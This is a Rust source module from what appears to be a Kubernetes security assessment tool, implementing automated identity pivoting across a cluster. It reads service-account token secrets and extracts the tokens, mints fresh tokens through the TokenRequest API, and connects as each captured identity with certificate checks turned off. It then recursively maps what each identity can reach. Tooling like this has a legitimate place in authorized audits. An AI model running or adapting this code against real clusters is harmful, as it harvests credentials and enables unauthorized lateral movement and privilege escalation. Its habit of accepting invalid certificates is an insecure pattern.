use std::collections::{HashSet, VecDeque};

use anyhow::Result;
use k8s_openapi::api::authorization::v1::SelfSubjectRulesReview;
use k8s_openapi::api::core::v1::Secret;
use kube::api::{Api, ListParams, PostParams};
use kube::Client;
use serde::Serialize;

use crate::analyzer::patterns::{all_dangerous_permissions, DangerousPermission, Severity};

use super::NamespacePermissions;

const MAX_IDENTITIES: usize = 50;

#[derive(Debug, Clone, Serialize, Default)]
pub struct PivotGraph {
    pub root_identity: String,
    pub nodes: Vec<PivotNode>,
    pub edges: Vec<PivotEdge>,
    pub max_depth_reached: u32,
}

#[derive(Debug, Clone, Serialize)]
pub struct PivotNode {
    pub identity: String,
    pub depth: u32,
    pub dangerous_permissions: Vec<String>,
    pub accessible_namespaces: Vec<String>,
    pub can_read_secrets_in: Vec<String>,
    pub can_create_tokens_in: Vec<String>,
    pub severity: Severity,
}

#[derive(Debug, Clone, Serialize)]
pub struct PivotEdge {
    pub from_identity: String,
    pub to_identity: String,
    pub method: PivotMethod,
    pub via: String,
    pub namespace: String,
    pub depth: u32,
}

#[derive(Debug, Clone, Serialize)]
pub enum PivotMethod {
    SecretToken,
    TokenRequest,
}

impl std::fmt::Display for PivotMethod {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            PivotMethod::SecretToken => write!(f, "SecretToken"),
            PivotMethod::TokenRequest => write!(f, "TokenRequest"),
        }
    }
}

pub async fn run_pivot(
    server_url: &str,
    initial_client: &Client,
    namespace_permissions: &[NamespacePermissions],
    known_namespaces: &[String],
    root_identity: &str,
    max_depth: u32,
) -> Result<PivotGraph> {
    let mut graph = PivotGraph {
        root_identity: root_identity.to_string(),
        ..Default::default()
    };

    let mut visited: HashSet<String> = HashSet::new();
    visited.insert(root_identity.to_string());

    let dangerous = all_dangerous_permissions();

    let root_analysis = analyze_permissions(namespace_permissions, &dangerous);
    graph.nodes.push(PivotNode {
        identity: root_identity.to_string(),
        depth: 0,
        dangerous_permissions: root_analysis.dangerous,
        accessible_namespaces: namespace_permissions
            .iter()
            .map(|np| np.namespace.clone())
            .collect(),
        can_read_secrets_in: root_analysis.secret_read_namespaces.clone(),
        can_create_tokens_in: root_analysis.token_create_namespaces.clone(),
        severity: root_analysis.max_severity,
    });

    if root_analysis.secret_read_namespaces.is_empty()
        && root_analysis.token_create_namespaces.is_empty()
    {
        eprintln!("[*] Current identity cannot read secrets or create tokens. No pivot paths.");
        return Ok(graph);
    }

    let mut frontier: VecDeque<(String, Client, u32)> = VecDeque::new();
    frontier.push_back((root_identity.to_string(), initial_client.clone(), 0));

    while let Some((current_identity, client, depth)) = frontier.pop_front() {
        if depth >= max_depth || graph.nodes.len() >= MAX_IDENTITIES {
            if graph.nodes.len() >= MAX_IDENTITIES {
                eprintln!(
                    "[!] Pivot cap reached ({} identities). Stopping.",
                    MAX_IDENTITIES
                );
            }
            break;
        }

        let current_node = match graph
            .nodes
            .iter()
            .find(|n| n.identity == current_identity)
            .cloned()
        {
            Some(n) => n,
            None => continue,
        };

        // Method 1: read SA token secrets
        for ns in &current_node.can_read_secrets_in {
            if graph.nodes.len() >= MAX_IDENTITIES {
                break;
            }

            let tokens = read_sa_token_secrets(&client, ns).await;
            for (sa_identity, token, secret_name) in &tokens {
                if visited.contains(sa_identity) {
                    continue;
                }
                if graph.nodes.len() >= MAX_IDENTITIES {
                    break;
                }

                visited.insert(sa_identity.clone());
                eprintln!(
                    "  [+] Pivot: {} -> {} (secret {}/{})",
                    short_identity(&current_identity),
                    short_identity(sa_identity),
                    ns,
                    secret_name
                );

                match build_pivot_client(server_url, token) {
                    Ok(new_client) => {
                        let perms =
                            enumerate_pivot_permissions(&new_client, known_namespaces).await;
                        let analysis = analyze_permissions(&perms, &dangerous);

                        graph.edges.push(PivotEdge {
                            from_identity: current_identity.clone(),
                            to_identity: sa_identity.clone(),
                            method: PivotMethod::SecretToken,
                            via: secret_name.clone(),
                            namespace: ns.clone(),
                            depth: depth + 1,
                        });

                        let can_pivot = !analysis.secret_read_namespaces.is_empty()
                            || !analysis.token_create_namespaces.is_empty();

                        graph.nodes.push(PivotNode {
                            identity: sa_identity.clone(),
                            depth: depth + 1,
                            dangerous_permissions: analysis.dangerous,
                            accessible_namespaces: perms
                                .iter()
                                .map(|np| np.namespace.clone())
                                .collect(),
                            can_read_secrets_in: analysis.secret_read_namespaces,
                            can_create_tokens_in: analysis.token_create_namespaces,
                            severity: analysis.max_severity,
                        });

                        if can_pivot && depth + 1 < max_depth {
                            frontier.push_back((sa_identity.clone(), new_client, depth + 1));
                        }
                    }
                    Err(e) => {
                        eprintln!(
                            "  [!] Client build failed for {}: {}",
                            short_identity(sa_identity),
                            e
                        );
                    }
                }
            }
        }

        // Method 2: TokenRequest API
        for ns in &current_node.can_create_tokens_in {
            if graph.nodes.len() >= MAX_IDENTITIES {
                break;
            }

            let sa_list = list_service_accounts(&client, ns).await;
            for sa_name in &sa_list {
                let sa_identity = format!("system:serviceaccount:{}:{}", ns, sa_name);
                if visited.contains(&sa_identity) {
                    continue;
                }
                if graph.nodes.len() >= MAX_IDENTITIES {
                    break;
                }

                match mint_token(&client, ns, sa_name).await {
                    Ok(token) => {
                        visited.insert(sa_identity.clone());
                        eprintln!(
                            "  [+] Pivot: {} -> {} (TokenRequest in {})",
                            short_identity(&current_identity),
                            short_identity(&sa_identity),
                            ns
                        );

                        match build_pivot_client(server_url, &token) {
                            Ok(new_client) => {
                                let perms =
                                    enumerate_pivot_permissions(&new_client, known_namespaces)
                                        .await;
                                let analysis = analyze_permissions(&perms, &dangerous);

                                graph.edges.push(PivotEdge {
                                    from_identity: current_identity.clone(),
                                    to_identity: sa_identity.clone(),
                                    method: PivotMethod::TokenRequest,
                                    via: sa_name.clone(),
                                    namespace: ns.clone(),
                                    depth: depth + 1,
                                });

                                let can_pivot = !analysis.secret_read_namespaces.is_empty()
                                    || !analysis.token_create_namespaces.is_empty();

                                graph.nodes.push(PivotNode {
                                    identity: sa_identity.clone(),
                                    depth: depth + 1,
                                    dangerous_permissions: analysis.dangerous,
                                    accessible_namespaces: perms
                                        .iter()
                                        .map(|np| np.namespace.clone())
                                        .collect(),
                                    can_read_secrets_in: analysis.secret_read_namespaces,
                                    can_create_tokens_in: analysis.token_create_namespaces,
                                    severity: analysis.max_severity,
                                });

                                if can_pivot && depth + 1 < max_depth {
                                    frontier
                                        .push_back((sa_identity.clone(), new_client, depth + 1));
                                }
                            }
                            Err(e) => {
                                eprintln!(
                                    "  [!] Client build failed for {}: {}",
                                    short_identity(&sa_identity),
                                    e
                                );
                            }
                        }
                    }
                    Err(_) => {}
                }
            }
        }

        if depth + 1 > graph.max_depth_reached {
            graph.max_depth_reached = depth + 1;
        }
    }

    eprintln!(
        "[+] Pivot complete: {} identities, {} edges, max depth {}",
        graph.nodes.len(),
        graph.edges.len(),
        graph.max_depth_reached
    );

    Ok(graph)
}

struct PermissionAnalysis {
    dangerous: Vec<String>,
    secret_read_namespaces: Vec<String>,
    token_create_namespaces: Vec<String>,
    max_severity: Severity,
}

fn analyze_permissions(
    namespace_perms: &[NamespacePermissions],
    dangerous_patterns: &[DangerousPermission],
) -> PermissionAnalysis {
    let mut dangerous: Vec<String> = Vec::new();
    let mut secret_read_namespaces = Vec::new();
    let mut token_create_namespaces = Vec::new();
    let mut max_severity = Severity::Info;

    for np in namespace_perms {
        let mut can_read_secrets = false;
        let mut can_create_tokens = false;

        for rule in &np.rules {
            let core_group = rule.api_group.is_empty() || rule.api_group == "*";

            if core_group
                && (rule.resource == "secrets" || rule.resource == "*")
                && (rule.verbs.iter().any(|v| v == "get" || v == "list" || v == "*"))
            {
                can_read_secrets = true;
            }

            if core_group
                && (rule.resource == "serviceaccounts/token" || rule.resource == "*")
                && rule.resource_names.is_empty()
                && (rule.verbs.iter().any(|v| v == "create" || v == "*"))
            {
                can_create_tokens = true;
            }

            for verb in &rule.verbs {
                for perm in dangerous_patterns {
                    if !rule.resource_names.is_empty() && perm.resource != "*" {
                        continue;
                    }
                    if permission_matches(perm, &rule.resource, verb, &rule.api_group) {
                        let title = perm.title.to_string();
                        if !dangerous.contains(&title) {
                            dangerous.push(title);
                            if perm.severity < max_severity {
                                max_severity = perm.severity;
                            }
                        }
                    }
                }
            }
        }

        if can_read_secrets {
            secret_read_namespaces.push(np.namespace.clone());
        }
        if can_create_tokens {
            token_create_namespaces.push(np.namespace.clone());
        }
    }

    PermissionAnalysis {
        dangerous,
        secret_read_namespaces,
        token_create_namespaces,
        max_severity,
    }
}

fn permission_matches(
    perm: &DangerousPermission,
    resource: &str,
    verb: &str,
    api_group: &str,
) -> bool {
    let resource_match = if perm.resource == "*" {
        resource == "*"
    } else {
        perm.resource == resource || resource == "*"
    };
    let verb_match = if perm.verbs.contains(&"*") {
        verb == "*"
    } else {
        perm.verbs.contains(&verb)
    };
    let group_match = perm.api_group == "*" || perm.api_group == api_group || api_group == "*";
    resource_match && verb_match && group_match
}

fn short_identity(identity: &str) -> &str {
    identity
        .strip_prefix("system:serviceaccount:")
        .unwrap_or(identity)
}

async fn read_sa_token_secrets(client: &Client, namespace: &str) -> Vec<(String, String, String)> {
    let secret_api: Api<Secret> = Api::namespaced(client.clone(), namespace);
    let secrets = match secret_api.list(&ListParams::default()).await {
        Ok(s) => s,
        Err(_) => return Vec::new(),
    };

    let mut results = Vec::new();

    for secret in &secrets.items {
        if secret.type_.as_deref() != Some("kubernetes.io/service-account-token") {
            continue;
        }

        let data = match &secret.data {
            Some(d) => d,
            None => continue,
        };

        let token_bytes = match data.get("token") {
            Some(t) => t,
            None => continue,
        };

        let token = match String::from_utf8(token_bytes.0.clone()) {
            Ok(t) => t,
            Err(_) => continue,
        };

        let sa_name = match secret
            .metadata
            .annotations
            .as_ref()
            .and_then(|a| a.get("kubernetes.io/service-account.name"))
        {
            Some(name) => name.clone(),
            None => continue,
        };

        let sa_identity = format!("system:serviceaccount:{}:{}", namespace, sa_name);
        let secret_name = secret.metadata.name.clone().unwrap_or_default();

        results.push((sa_identity, token, secret_name));
    }

    results
}

fn build_pivot_client(server_url: &str, token: &str) -> Result<Client> {
    let mut config = kube::Config::new(server_url.parse()?);
    config.auth_info.token = Some(secrecy::SecretString::from(token.to_string()));
    config.accept_invalid_certs = true;
    Client::try_from(config).map_err(Into::into)
}

async fn enumerate_pivot_permissions(
    client: &Client,
    known_namespaces: &[String],
) -> Vec<NamespacePermissions> {
    let mut all_perms = Vec::new();

    for ns in known_namespaces {
        let ssrr_api: Api<SelfSubjectRulesReview> = Api::all(client.clone());
        let review = SelfSubjectRulesReview {
            metadata: Default::default(),
            spec: k8s_openapi::api::authorization::v1::SelfSubjectRulesReviewSpec {
                namespace: Some(ns.clone()),
            },
            status: None,
        };

        match ssrr_api.create(&PostParams::default(), &review).await {
            Ok(result) => {
                let mut rules = Vec::new();
                if let Some(status) = result.status {
                    for rule in status.resource_rules {
                        let verbs = rule.verbs;
                        let resources = rule.resources.unwrap_or_default();
                        let api_groups = rule.api_groups.unwrap_or_default();
                        let resource_names = rule.resource_names.unwrap_or_default();

                        for resource in &resources {
                            for api_group in &api_groups {
                                rules.push(super::PermissionRule {
                                    resource: resource.clone(),
                                    api_group: api_group.clone(),
                                    verbs: verbs.clone(),
                                    resource_names: resource_names.clone(),
                                });
                            }
                        }
                    }
                }
                if !rules.is_empty() {
                    all_perms.push(NamespacePermissions {
                        namespace: ns.clone(),
                        rules,
                    });
                }
            }
            Err(_) => continue,
        }
    }

    all_perms
}

async fn list_service_accounts(client: &Client, namespace: &str) -> Vec<String> {
    use k8s_openapi::api::core::v1::ServiceAccount;
    let sa_api: Api<ServiceAccount> = Api::namespaced(client.clone(), namespace);
    match sa_api.list(&ListParams::default()).await {
        Ok(list) => list
            .items
            .iter()
            .filter_map(|sa| sa.metadata.name.clone())
            .collect(),
        Err(_) => Vec::new(),
    }
}

async fn mint_token(client: &Client, namespace: &str, sa_name: &str) -> Result<String> {
    let body = serde_json::json!({
        "apiVersion": "authentication.k8s.io/v1",
        "kind": "TokenRequest",
        "spec": {
            "expirationSeconds": 3600
        }
    });

    let req = http::Request::builder()
        .method("POST")
        .uri(format!(
            "/api/v1/namespaces/{}/serviceaccounts/{}/token",
            namespace, sa_name
        ))
        .header(http::header::CONTENT_TYPE, "application/json")
        .body(serde_json::to_vec(&body)?)
        .map_err(|e| anyhow::anyhow!("{}", e))?;

    let response: serde_json::Value = client.request(req).await?;

    response["status"]["token"]
        .as_str()
        .map(|s| s.to_string())
        .ok_or_else(|| anyhow::anyhow!("No token in TokenRequest response"))
}
